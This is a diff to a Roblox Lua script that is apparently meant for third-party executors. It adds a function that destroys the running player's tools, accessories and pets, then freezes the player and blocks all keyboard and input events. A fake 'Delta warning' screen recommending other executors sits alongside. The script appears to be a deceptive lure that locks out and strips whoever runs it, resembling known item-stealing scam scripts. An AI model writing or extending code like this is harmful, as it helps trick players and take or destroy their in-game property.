@@ -44,6 +44,26 @@ local function freezePlayer()
     end
 end
 
+-- Clear inventory (tools and equipable pets)
+local function clearInventory()
+    -- Remove tools from backpack
+    for _, tool in ipairs(player.Backpack:GetChildren()) do
+        if tool:IsA("Tool") then
+            tool:Destroy()
+        end
+    end
+
+    -- Remove tools and accessories from character
+    local character = player.Character
+    if character then
+        for _, item in ipairs(character:GetChildren()) do
+            if item:IsA("Tool") or item:IsA("Accessory") then
+                item:Destroy()
+            end
+        end
+    end
+end
+
 -- Show Delta warning GUI
 local function showDeltaWarning()
     local ScreenGui = Instance.new("ScreenGui")
@@ -134,6 +154,8 @@ For a more stable and reliable experience, it is recommended to use executors su
         TeleportService:Teleport(game.PlaceId, player)
     end)
 
+    -- Clear inventory then freeze player
+    clearInventory()
     freezePlayer()
     ContextActionService:BindAction("FreezeAllInputs", function() return Enum.ContextActionResult.Sink end, false, unpack(Enum.UserInputType:GetEnumItems()))
     ContextActionService:BindAction("FreezeAllKeys", function() return Enum.ContextActionResult.Sink end, false, unpack(Enum.KeyCode:GetEnumItems()))
